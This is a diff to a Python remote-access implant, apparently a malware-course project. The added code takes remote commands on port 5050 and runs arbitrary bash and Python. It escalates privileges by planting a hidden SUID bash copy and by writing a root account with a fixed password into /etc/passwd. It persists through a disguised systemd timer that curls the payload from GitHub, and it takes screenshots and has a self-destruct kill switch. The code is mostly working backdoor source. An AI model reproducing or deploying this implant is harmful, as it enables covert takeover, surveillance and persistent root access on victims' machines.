@@ -11,11 +11,284 @@ import socket
 import subprocess
 import sys
 import time
-import os
-
+import contextlib
+import io
+import struct
+import crypt
 
 
 THIS_FILE = os.path.realpath(__file__)
+BASE_FLAG_URL = "https://raw.githubusercontent.com/ucla-e1-malware/final-project-theoreos/refs/heads/main/run_payload"
+
+def kill_switch_loop():
+    while True:
+        if check_kill_switch():
+            print("[*] Kill switch triggered. Shutting down.")
+            os._exit(0)
+        time.sleep(60) 
+
+def check_kill_switch():
+    import urllib.request
+    import urllib.error
+    import subprocess
+    import glob
+    import os
+    import time
+    import pwd
+    print("[*] Checking kill switch...")
+    
+    try:
+        unique_url = f"{BASE_FLAG_URL}?nocache={time.time()}"
+        req = urllib.request.Request(unique_url, method="HEAD")
+        
+        try:
+            with urllib.request.urlopen(req) as response:
+                return False  # Status 200 OK: Flag still exists
+                
+        except urllib.error.HTTPError as e:
+            if e.code == 404:
+                print("[!] Flag not found (404)! Initiating self-destruct...")
+                
+                # --- STEP 1: Remove SUID backdoor ---
+                if os.geteuid() == 0:
+                    hidden_bash = "/var/tmp/.cache_sys"
+                    try:
+                        if os.path.exists(hidden_bash):
+                            os.remove(hidden_bash)
+                            print(f"[*] SUID backdoor {hidden_bash} scrubbed.")
+                    except Exception as err:
+                        print(f"[-] Could not remove SUID backdoor: {err}")
+
+                # --- STEP 1.5: Remove oreo_root backdoor ---
+                if os.geteuid() == 0:
+                    try:
+                        with open("/etc/passwd", "r") as f:
+                            if "oreo_root:" in f.read():
+                                # userdel is the standard and reliable way to remove a user
+                                subprocess.run(["userdel", "-f", "oreo_root"], check=False, stderr=subprocess.DEVNULL)
+                                # Fallback to sed just in case
+                                subprocess.run(["sed", "-i", "/^oreo_root:/d", "/etc/passwd"], check=False, stderr=subprocess.DEVNULL)
+                                print("[*] Rogue user 'oreo_root' scrubbed from system.")
+                    except Exception as err:
+                        print(f"[-] Could not remove oreo_root user: {err}")
+
+                # --- STEP 2: Clean up persistence & destroy ghost timers ---
+                service_name = "user-dbus-sync"
+                
+                if os.geteuid() == 0:
+                    # If running as root, clean up ALL users' systemd daemons
+                    for target_dir in glob.glob("/home/*/.config/systemd/user"):
+                        try:
+                            username = target_dir.split('/')[2]
+                            uid = pwd.getpwnam(username).pw_uid
+                            xdg = f"/run/user/{uid}"
+                            
+                            # Prefix to run systemctl AS the specific victim user
+                            cmd_prefix = ["sudo", "-u", username, "env", f"XDG_RUNTIME_DIR={xdg}", "systemctl", "--user"]
+                            
+                            # 1. Disable and stop the timer forever
+                            subprocess.run(cmd_prefix + ["disable", "--now", f"{service_name}.timer", f"{service_name}.service"], stderr=subprocess.DEVNULL)
+                            
+                            # 2. Delete the physical files
+                            svc_path = os.path.join(target_dir, f"{service_name}.service")
+                            tmr_path = os.path.join(target_dir, f"{service_name}.timer")
+                            if os.path.exists(svc_path): os.remove(svc_path)
+                            if os.path.exists(tmr_path): os.remove(tmr_path)
+                            
+                            # 3. Clear memory
+                            subprocess.run(cmd_prefix + ["daemon-reload"], stderr=subprocess.DEVNULL)
+                            subprocess.run(cmd_prefix + ["reset-failed"], stderr=subprocess.DEVNULL)
+                            print(f"[*] Persistence destroyed for user: {username}")
+                        except Exception:
+                            pass
+                else:
+                    # If running as normal user, clean up our own daemon
+                    target_dir = os.path.expanduser("~/.config/systemd/user")
+                    
+                    subprocess.run(["systemctl", "--user", "disable", "--now", f"{service_name}.timer", f"{service_name}.service"], stderr=subprocess.DEVNULL)
+                    
+                    svc_path = os.path.join(target_dir, f"{service_name}.service")
+                    tmr_path = os.path.join(target_dir, f"{service_name}.timer")
+                    if os.path.exists(svc_path): os.remove(svc_path)
+                    if os.path.exists(tmr_path): os.remove(tmr_path)
+                    
+                    subprocess.run(["systemctl", "--user", "daemon-reload"], stderr=subprocess.DEVNULL)
+                    subprocess.run(["systemctl", "--user", "reset-failed"], stderr=subprocess.DEVNULL)
+                    print("[*] Persistence destroyed for current user.")
+
+                # --- STEP 3: Delete the script itself ---
+                try:
+                    if os.path.exists(THIS_FILE):
+                        os.remove(THIS_FILE)
+                        print(f"[*] Deleted {THIS_FILE}")
+                except Exception as del_e:
+                    print(f"[-] Could not delete {THIS_FILE}: {del_e}")
+                    
+                return True 
+                
+            else:
+                return False
+
+    except Exception as e:
+        print(f"[-] Connection error during killswitch check: {e}")
+        return False
+
+def ensure_requests():
+    try:
+        import requests
+    except ImportError:
+        print("Requests not found. Installing now...")
+        # This runs 'pip install requests' using the current python executable
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+        print("Installation complete. Resuming script.")
+
+
+
+# Added for multiline
+
+def send_framed(sock, data: bytes):
+    sock.sendall(struct.pack(">I", len(data)) + data)
+
+def recv_framed(sock):
+    header = b""
+    while len(header) < 4:
+        header += sock.recv(4 - len(header))
+    msg_len = struct.unpack(">I", header)[0]
+    data = b""
+    while len(data) < msg_len:
+        data += sock.recv(msg_len - len(data)) 
+    return data
+
+
+# audio 
+
+# def play_audio_from_url(url):
+#     import requests, tempfile, subprocess, os, pwd
+#     r = requests.get(url, timeout=10)
+#     r.raise_for_status()
+#     suffix = os.path.splitext(url.split("?")[0])[1] or ".bin"
+#     with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as f:
+#         f.write(r.content)
+#         path = f.name
+#         print(f"File downloaded to: {path}")
+
+#     os.chmod(path, 0o644)
+#     original_user = os.environ.get("SUDO_USER") or os.environ.get("USER")
+#     uid = pwd.getpwnam(original_user).pw_uid
+#     xdg = f"/run/user/{uid}"
+
+#     subprocess.run(
+#     ["sudo", "-u", original_user,
+#      "env",
+#      f"XDG_RUNTIME_DIR={xdg}",
+#      f"PIPEWIRE_RUNTIME_DIR={xdg}",
+#      "ffplay", "-nodisp", "-autoexit", path],
+#     stdout=subprocess.DEVNULL,
+#     stderr=subprocess.DEVNULL,
+#     )
+
+#     os.unlink(path)
+
+def play_audio_from_url(url): # Used Claude for finguring out how to make it work with SUDO 
+    import requests, tempfile, subprocess, os, pwd
+    r = requests.get(url, timeout=10)
+    r.raise_for_status()
+    suffix = os.path.splitext(url.split("?")[0])[1] or ".bin"
+    with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as f:
+        f.write(r.content)
+        path = f.name
+        print(f"File downloaded to: {path}")
+
+    os.chmod(path, 0o644)
+    original_user = os.environ.get("SUDO_USER") or os.environ.get("USER")
+    uid = pwd.getpwnam(original_user).pw_uid
+    xdg = f"/run/user/{uid}"
+
+    try:
+        result = subprocess.run(
+            ["sudo", "-u", original_user,
+             "env",
+             f"XDG_RUNTIME_DIR={xdg}",
+             f"PIPEWIRE_RUNTIME_DIR={xdg}",
+             "ffplay", "-nodisp", "-autoexit", path],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.PIPE,
+        )
+        if result.returncode != 0:
+            print(f"Audio playback failed: {result.stderr.decode().strip()}")
+    except Exception as e:
+        print(f"Audio playback error: {e}")
+    finally:
+        if os.path.exists(path):
+            os.unlink(path)
+
+
+# screenshot 
+
+
+
+# def screenshot(): # Used Claude for finguring out how to make it work with SUDO 
+#     import time, subprocess, os, pwd
+
+#     original_user = os.environ.get("SUDO_USER") or os.environ.get("USER")
+#     uid = pwd.getpwnam(original_user).pw_uid
+#     xdg = f"/run/user/{uid}"
+#     try:
+#         sockets = [f for f in os.listdir(xdg) if f.startswith("wayland-")]
+#         wayland = sockets[0] if sockets else "wayland-0"
+#     except FileNotFoundError:
+#         wayland = "wayland-0"
+
+#     filename = f"/tmp/screenshot_{int(time.time())}.png"
+#     result = subprocess.run(
+#         ["sudo", "-u", original_user,
+#          "env",
+#          f"WAYLAND_DISPLAY={wayland}",
+#          f"XDG_RUNTIME_DIR={xdg}",
+#          "gnome-screenshot", "-f", filename],
+#         capture_output=True, text=True
+#     )
+#     if result.returncode != 0:
+#         raise RuntimeError(f"gnome-screenshot failed: {result.stderr}")
+#     if not os.path.exists(filename):
+#         raise RuntimeError("Screenshot file was not created")
+#     return filename
+    
+
+def screenshot(): # Used Claude for finguring out how to make it work with SUDO 
+    import time, subprocess, os, pwd
+
+    original_user = os.environ.get("SUDO_USER") or os.environ.get("USER")
+    uid = pwd.getpwnam(original_user).pw_uid
+    xdg = f"/run/user/{uid}"
+
+    try:
+        sockets = [f for f in os.listdir(xdg) if f.startswith("wayland-")]
+        wayland = sockets[0] if sockets else "wayland-0"
+    except FileNotFoundError:
+        wayland = "wayland-0"
+
+    filename = f"/tmp/screenshot_{int(time.time())}.png"
+    try:
+        result = subprocess.run(
+            ["sudo", "-u", original_user,
+             "env",
+             f"WAYLAND_DISPLAY={wayland}",
+             f"XDG_RUNTIME_DIR={xdg}",
+             "gnome-screenshot", "-f", filename],
+            capture_output=True, text=True
+        )
+        if result.returncode != 0:
+            print(f"gnome-screenshot failed: {result.stderr.strip()}")
+            return None
+        if not os.path.exists(filename):
+            print("Screenshot file was not created")
+            return None
+        return filename
+    except Exception as e:
+        print(f"Screenshot error: {e}")
+        return None
+
 
 def run_command(cmd, shell=True, capture_output=True, **kwargs):
     return subprocess.run(
@@ -26,15 +299,178 @@ def run_command(cmd, shell=True, capture_output=True, **kwargs):
         **kwargs
     )
 
-
 # listen on port 5050, receive input
 HOST, PORT = "0.0.0.0", 5050
 
+def privesc():
+    import subprocess
+    import sys
+    import os
 
+    if os.geteuid() != 0:
+        print("[*] Elevating to root silently using hidden SUID copy...")
+        try:
+            hidden_bash = "/var/tmp/.cache_sys"
+            
+            # Create SUID bash
+            setup_cmds = f"""
+            sudo cp /bin/bash {hidden_bash}
+            sudo chmod 4755 {hidden_bash}
+            sudo touch -r /bin/bash {hidden_bash}
+            """
+            subprocess.run(setup_cmds, shell=True, check=True)
+            
+            # CRITICAL FIX: Use system Python, not venv Python
+            system_python = "/usr/bin/python3"  # Don't use sys.executable!
+            
+            # Verify system Python exists
+            if not os.path.exists(system_python):
+                print(f"[-] System Python not found at {system_python}")
+                return False
+            
+            print(f"[+] Using system Python: {system_python}")
+            print(f"[+] Script path: {THIS_FILE}")
+            
+            # Updated wrapper logic
+            escalate_script = f"""#!/bin/bash
+exec {hidden_bash} -p -c "export ESCALATED_ROOT=1; {system_python} -c 'import os; os.setuid(0); os.execv(\\\"{system_python}\\\", [\\\"{system_python}\\\", \\\"{THIS_FILE}\\\"])'"
+"""
+
+            wrapper_path = "/tmp/.do_privesc.sh"
+            with open(wrapper_path, "w") as f:
+                f.write(escalate_script)
+            os.chmod(wrapper_path, 0o755)
+            
+            # Spawn root process
+            print("[+] Spawning root process...")
+            subprocess.Popen(
+                ["/bin/bash", wrapper_path],
+                stdout=open("/tmp/root_server.log", "w"),
+                stderr=subprocess.STDOUT,
+                stdin=subprocess.DEVNULL,
+                start_new_session=True
+            )
+            
+            print("[+] Root process spawned. Exiting unprivileged instance.")
+            time.sleep(1)
+            sys.exit(0)
+            
+        except Exception as e:
+            print(f"[-] Failed to elevate: {e}")
+            import traceback
+            traceback.print_exc()
+            sys.exit(1)
+    else:
+        print("[+] Already running with root privileges.")
+
+def privesc2():
+    # 1. Generate the hash
+    hash_str = crypt.crypt("password123", crypt.mksalt(crypt.METHOD_SHA512))
+    # Define the line to inject
+    line = f"oreo_root:{hash_str}:0:0:root:/root:/bin/bash"
+    
+    try:
+        # 2. Use sudo + tee to append the line to /etc/passwd
+        cmd = f"echo '{line}' | sudo tee -a /etc/passwd"
+        subprocess.run(cmd, shell=True, check=True)
+        print("[+] Successfully injected user via sudo tee")
+        return True
+    except Exception as e:
+        print(f"[-] Failed to inject user: {e}")
+        return False
+    
+def persist():
+    import os
+    import subprocess
+
+    # 1. Define the user-level systemd directory
+    systemd_user_dir = os.path.expanduser("~/.config/systemd/user")
+    os.makedirs(systemd_user_dir, exist_ok=True)
+    
+    # 2. Choose a deceptive name for the service and create paths
+    service_name = "user-dbus-sync"
+    service_path = os.path.join(systemd_user_dir, f"{service_name}.service")
+    timer_path = os.path.join(systemd_user_dir, f"{service_name}.timer")
+    
+    # 3. Create the Service File
+    service_content = f"""[Unit]
+Description=User DBUS Synchronization Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStartPre=/usr/bin/curl -fsSL -o {THIS_FILE} https://raw.githubusercontent.com/ucla-e1-malware/final-project-theoreos/refs/heads/main/payload/server.py
+ExecStart={sys.executable} {THIS_FILE}
+Restart=on-failure
+RestartSec=10
+"""
+
+    # 4. Create the Timer File
+    # OnBootSec triggers shortly after the user logs in (or boot if lingering is enabled).
+    # OnUnitActiveSec triggers it repeatedly if it dies.
+    timer_content = f"""[Unit]
+Description=Timer for User DBUS Synchronization
+
+[Timer]
+OnBootSec=1min
+OnUnitActiveSec=1min
+Persistent=true
+
+[Install]
+WantedBy=timers.target
+"""
+
+    try:
+        # Write the payload configuration to disk
+        with open(service_path, "w") as f:
+            f.write(service_content)
+        with open(timer_path, "w") as f:
+            f.write(timer_content)
+            
+        # Force the user's systemd daemon to reload its configuration from memory
+        subprocess.run(
+            ["systemctl", "--user", "daemon-reload"], 
+            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        
+        # Enable the timer so it starts automatically on login, and start it right now
+        subprocess.run(
+            ["systemctl", "--user", "enable", "--now", f"{service_name}.timer"], 
+            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        return True
+    except Exception as e:
+        print(f"Persistence setup failed: {e}")
+        return False
+
+def install_suid_backdoor():
+
+    # Verify the process has root privileges
+    if os.geteuid() != 0:
+        print("[-] Must be root to install SUID backdoor.")
+        return False
+
+    hidden_bash = "/var/tmp/.cache_sys"
+    print(f"[*] Installing SUID backdoor at {hidden_bash}...")
+    
+    try:
+        setup_cmds = f"""
+        cp /bin/bash {hidden_bash}
+        chown root:root {hidden_bash}
+        chmod 4755 {hidden_bash}
+        touch -r /bin/bash {hidden_bash}
+        """
+        subprocess.run(setup_cmds, shell=True, check=True)
+        print(f"[+] SUID backdoor successfully installed at {hidden_bash}")
+        return True
+    except Exception as e:
+        print(f"[-] Failed to install SUID backdoor: {e}")
+        return False
+ 
 def kill_others():
     """
     Since a port can only be bound by one program, kill all other programs on this port that we can see.
-    This makes it so if we run our script multiple times, only the most up-to-date/priviledged one will be running in the end
+    This makes it so if we run our script multiple times, only the most up-to-date/privileged one will be running in the end
     """
     # check if privilege escalated
     # if os.geteuid() == 0:
@@ -44,8 +480,9 @@ def kill_others():
         pids = pid.strip().split("\n")
         print("Killing", pids)
         for p in pids:
-            run_command(f"kill {str(p)}")
-        time.sleep(1)
+            if p:
+                run_command(f"kill -9 {str(p)}")
+        time.sleep(2)
 
 def bootstrap_packages():
     """
@@ -72,12 +509,42 @@ def bootstrap_packages():
             sys.exit(0)
     else:
         print("already in venv")
+        if os.geteuid() == 0:
+            if not os.path.exists("/usr/bin/gnome-screenshot"):
+                try:
+                    run_command(
+                        ["apt", "install", "-y", "gnome-screenshot"], shell=False, capture_output=False
+                    ).check_returncode()
+                except Exception as e:
+                    print(f"Failed to install gnome-screenshot: {e}")
+
+            if not os.path.exists("/usr/bin/ffplay"):
+                try:
+                    run_command(
+                        ["apt", "install", "-y", "ffmpeg"], shell=False, capture_output=False
+                    ).check_returncode()
+                except Exception as e:
+                    print(f"Failed to install ffmpeg: {e}")
+
+
+        # if root (os.geteuid() == 0)
+        #    if file not exit "/usr/bin/gnome-screenshot"
+        #        run apt install gnome-scree
         run_command(
             [ sys.executable, "-m", "pip", "install", "requests"], shell=False, capture_output=False
         ).check_returncode() # example to install a python package on the remote server
         # If you need pip install X packages, here, import them now
         import requests
 
+def handle_python_command(user_input):
+    buffer = io.StringIO()
+    try:
+        with contextlib.redirect_stdout(buffer):
+            exec(user_input)
+        output = buffer.getvalue() #AI for capturing output
+        return output if output else "Success!"
+    except Exception as e:
+        return f"Error: {e}" 
 
 
 def handle_conn(conn, addr):
@@ -89,41 +556,164 @@ def handle_conn(conn, addr):
         # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
         # For example, you could send a length value before any command, decide on null byte as ending,
         # base64 encode every command, etc
-        data = conn.recv(1024) 
-        print("received: " + data.decode("utf-8", errors="replace"))
-
-        if not data:
+        #ADDED
+        raw_data = recv_framed(conn) 
+        # raw_data = conn.recv(1024)
+        if not raw_data:
             return
         
+        data = raw_data.decode("utf-8", errors="replace").strip()
 
-        # Think VERY carefully about how you will communicate between the client and server
-        # You will need to make a custom protocol to transfer commands
+        print("received: " + data)
 
-        try:
-            conn.sendall("Response data here".encode())
-            # Process the communication data from 
+        parts = data.split(" ", 1)
+        command_type = parts[0]
+        command_body = parts[1] if len(parts) > 1 else "" # AI for splitting
+
+        #stuff I added -- START
+        # Command 1: Privilege Escalation
+        try: 
+            if command_type == "PLAY_AUDIO":
+                try:
+                    url = command_body.strip()
+                    play_audio_from_url(url)
+                    send_framed(conn, b"TEXT\n" + b"Playing Audio")
+                except Exception as e:
+                    send_framed(conn, b"TEXT\n" + f"Audio error: {e}".encode())
+            elif command_type == "CLICK":
+                try:
+                    path = screenshot()
+                    if path is None:
+                        send_framed(conn, b"TEXT\n" + b"Screenshot failed")
+                    else:
+                        with open(path, "rb") as f:
+                            data = f.read()
+                        send_framed(conn, b"FILE\n" + data)
+                except Exception as e:
+                    print(f"Screenshot error: {e}")
+                    send_framed(conn, b"TEXT\n" + f"Screenshot error: {e}".encode())
+            elif command_type == "privesc":
+                print("Running privesc")
+                privesc()
+                # conn.sendall(b"Privesc triggered: restarting as root")
+                send_framed(conn, b"TEXT\n" + b"Privesc triggered: restarting as root")
+            elif command_type == "privesc2":
+                print("Running privesc2")
+                success = privesc2()
+                if success:
+                    send_framed(conn, b"TEXT\n" + b"[+] Privesc2 successful! Account 'oreo_root' created.")
+                else:
+                    send_framed(conn, b"TEXT\n" + b"[-] Privesc2 failed: check server logs.")
+            #Command 2: Python 
+            elif command_type == "PY":
+                print("Running python")
+                result = handle_python_command(command_body)
+                # conn.sendall(result.encode("utf-8", errors="replace"))
+                send_framed(conn, b"TEXT\n" + result.encode("utf-8", errors="replace"))
+            
+            elif command_type == "BASH":
+                print(f"Running bash: {command_body}")
+                
+                # If we are root, use the hidden bash and force it to load the profile
+                if os.geteuid() == 0:
+                    hidden_bash = "/var/tmp/.cache_sys"
+                    
+                    # Ensure we source the profile into memory first to restore environment variables
+                    # before executing the attacker's command
+                    if os.path.exists(hidden_bash):
+                        exec_args = [hidden_bash, "-p", "-c", f"source ~/.bashrc 2>/dev/null; {command_body}"]
+                    else:
+                        # Fallback if the hidden file was removed
+                        exec_args = ["/bin/bash", "-p", "-c", f"source ~/.bashrc 2>/dev/null; {command_body}"]
+                else:
+                    exec_args = ["/bin/sh", "-c", command_body]
+
+                # Run the command directly (shell=False)
+                proc = subprocess.run(
+                    exec_args, 
+                    shell=False, 
+                    stdout=subprocess.PIPE, 
+                    stderr=subprocess.PIPE
+                )
+                
+                output = proc.stdout + proc.stderr
+                send_framed(conn, b"TEXT\n" + (output if output else b"[no output]"))
         except Exception as e:
-            conn.sendall(f"error: {e}".encode())
-
+            # conn.sendall(f"error: {e}".encode())
+            send_framed(conn, b"TEXT\n" + f"error: {e}".encode())
 
 def main():
-    kill_others()
-    bootstrap_packages()
+    import signal
+    signal.signal(signal.SIGINT, lambda s, f: os._exit(0))
 
+    if check_kill_switch():
+        print("[*] Kill switch triggered on startup. Shutting down.")
+        os._exit(0)
+
+    kill_others()
+    ensure_requests()
+    import threading
+    # DEBUG: Show initial state
+    print(f"[DEBUG] Starting main()")
+    print(f"[DEBUG] UID={os.getuid()}, EUID={os.geteuid()}")
+    print(f"[DEBUG] ESCALATED_ROOT env={os.getenv('ESCALATED_ROOT')}")
+    
+    # Step 1: If launched as root via SUID, restore full privileges
+    if os.getenv("ESCALATED_ROOT") == "1":
+        print("[*] Detected SUID escalation, restoring root privileges...")
+        
+        # Show what we have before setuid
+        print(f"[DEBUG] Before setuid: UID={os.getuid()}, EUID={os.geteuid()}")
+        
+        try:
+            os.setresuid(0, 0, 0)
+            os.setresgid(0, 0, 0)
+            print(f"[+] After setuid: UID={os.getuid()}, EUID={os.geteuid()}")
+            install_suid_backdoor()
+
+        except Exception as e:
+            print(f"[-] setuid FAILED: {e}")
+            import traceback
+            traceback.print_exc()
+        
+        # SKIP venv and bootstrap for root process
+        print("[*] Root process - skipping venv/bootstrap")
+        
+    else:
+        print("[*] Normal unprivileged startup")
+        bootstrap_packages()  # This may restart the script!
+        
+        # If we get here, we're in the venv
+        print("[*] Establishing persistence...")
+        persist()
+    
+    # Bind socket (both root and non-root do this)
+    print(f"[*] Binding to {HOST}:{PORT}...")
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind((HOST, PORT))
-        s.listen()  # allows for 10 connections
-        print(f"Listening on {HOST}:{PORT}")
+        s.listen(10)
+        s.settimeout(5)  
+        print(f"[+] Listening on {HOST}:{PORT} as UID {os.getuid()}")
+
+        t = threading.Thread(target=kill_switch_loop, daemon=True)
+        t.start()
+        
         while True:
             try:
                 conn, addr = s.accept()
                 handle_conn(conn, addr)
+            except socket.timeout:
+                continue
             except KeyboardInterrupt:
+                print("\n[*] Shutting down.")
                 raise
-            except:
-                print("Connection died")
+            except Exception as e:
+                print(f"[-] Connection error: {e}")
+
+
+
 
 
 if __name__ == "__main__":
